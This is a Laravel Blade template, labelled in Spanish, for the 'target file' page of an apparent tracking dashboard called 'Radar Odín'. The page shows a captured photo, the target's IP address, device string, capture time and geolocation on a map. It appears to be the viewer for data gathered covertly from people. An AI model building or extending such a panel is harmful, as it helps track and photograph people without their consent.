<x-app-layout>
    <style>
        .target-header {
            font-family: 'Cinzel', serif;
            color: #c5a059;
            text-shadow: 0 0 10px rgba(197, 160, 89, 0.5);
            letter-spacing: 3px;
            border-bottom: 1px solid rgba(197, 160, 89, 0.3);
            padding-bottom: 15px;
            margin-bottom: 30px;
        }

        .monitor-card {
            background: rgba(10, 10, 12, 0.9) !important;
            border: 1px solid #c5a059 !important;
            box-shadow: 0 0 30px rgba(0,0,0,0.8);
            border-radius: 0;
        }

        .photo-frame {
            border: 2px solid #c5a059;
            padding: 5px;
            background: #000;
            position: relative;
            overflow: hidden;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .photo-frame img {
            width: 100%;
            height: auto;
            filter: sepia(0.2) contrast(1.2);
        }

        .photo-frame::before {
            content: "RECONOCIMIENTO FACIAL: OK";
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(197, 160, 89, 0.8);
            color: #000;
            font-size: 10px;
            padding: 2px 5px;
            font-weight: bold;
            z-index: 10;
        }

        .data-label {
            color: #c5a059;
            text-transform: uppercase;
            font-size: 0.8rem;
            letter-spacing: 1px;
            margin-bottom: 5px;
        }

        .data-value {
            color: #ffffff;
            font-family: 'Courier New', monospace;
            font-size: 1.1rem;
            margin-bottom: 20px;
            background: rgba(255,255,255,0.05);
            padding: 10px;
            border-left: 3px solid #c5a059;
            word-break: break-all;
        }

        #map {
            height: 400px;
            width: 100%;
            border: 1px solid #c5a059;
            filter: invert(100%) hue-rotate(180deg) brightness(0.8) contrast(1.2);
        }
    </style>

    <div class="container-fluid py-4">
        <h1 class="target-header">
            <i class="fas fa-crosshairs mr-3"></i> EXPEDIENTE DEL OBJETIVO: #{{ $target->id }}
        </h1>

        <div class="row">
            <div class="col-md-7">
                <div class="card monitor-card">
                    <div class="card-body">
                        <h5 class="text-white mb-3 uppercase small text-muted">Localización Geográfica (Radar)</h5>
                        <div id="map"></div>
                        
                        <div class="mt-4 p-3 bg-black text-warning font-mono small border border-warning/20">
                            <i class="fas fa-satellite mr-2"></i> 
                            ESTADO: <span id="gps-status">ANALIZANDO COORDENADAS...</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-md-5">
                <div class="card monitor-card">
                    <div class="card-body">
                        <div class="photo-frame mb-4">
                            @php
                                // Extraemos el nombre del archivo para forzar la carga local
                                $fileName = basename($target->photo_path);
                                $localUrl = asset('storage/captures/' . $fileName);
                            @endphp
                            <img src="{{ $localUrl }}" 
                                 alt="Captura Biométrica" 
                                 onerror="this.src='https://via.placeholder.com/400x300/000000/c5a059?text=ERROR+DE+CARGA+LOCAL';">
                        </div>

                        <div class="data-group">
                            <div class="data-label">Identificación de Red (IP)</div>
                            <div class="data-value">{{ $target->ip }}</div>

                            <div class="data-label">Dispositivo Detectado</div>
                            <div class="data-value">{{ $target->user_agent }}</div>

                            <div class="data-label">Cronología de Captura</div>
                            <div class="data-value">{{ $target->created_at->format('d/m/Y H:i:s') }}</div>

                            <div class="data-label">Información de Ubicación Recibida</div>
                            <div class="data-value" id="raw-location">{{ $target->location }}</div>
                        </div>

                        <a href="{{ route('odin.list') }}" class="btn btn-outline-warning btn-block mt-4 uppercase font-bold">
                            <i class="fas fa-chevron-left mr-2"></i> Volver al Monitor
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Obtenemos la ubicación y limpiamos cualquier texto extra
            const rawLocation = document.getElementById('raw-location').innerText;
            const cleanLoc = rawLocation.replace(/[^\d.,-]/g, ''); 
            const coords = cleanLoc.split(',');

            const gpsStatus = document.getElementById('gps-status');

            if (coords.length === 2 && !isNaN(parseFloat(coords[0])) && !isNaN(parseFloat(coords[1]))) {
                const lat = parseFloat(coords[0]);
                const lon = parseFloat(coords[1]);

                gpsStatus.innerText = "COORDENADAS VÁLIDAS: " + lat + ", " + lon;
                gpsStatus.classList.remove('text-warning');
                gpsStatus.classList.add('text-success');

                const map = L.map('map').setView([lat, lon], 15);

                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: 'Radar Odín'
                }).addTo(map);

                // Marcador táctico
                const targetIcon = L.divIcon({
                    className: 'custom-div-icon',
                    html: "<div style='background-color:#c5a059; width:15px; height:15px; border-radius:50%; border:2px solid white; box-shadow:0 0 15px rgba(255,0,0,0.8);'></div>",
                    iconSize: [15, 15],
                    iconAnchor: [7, 7]
                });

                L.marker([lat, lon], {icon: targetIcon}).addTo(map)
                    .bindPopup("<b>OBJETIVO LOCALIZADO</b><br>IP: {{ $target->ip }}").openPopup();
            } else {
                gpsStatus.innerText = "ERROR: FORMATO DE COORDENADAS INVÁLIDO.";
                gpsStatus.classList.add('text-danger');
                // Mapa por defecto en caso de error
                const map = L.map('map').setView([0, 0], 2);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            }
        });
    </script>
</x-app-layout>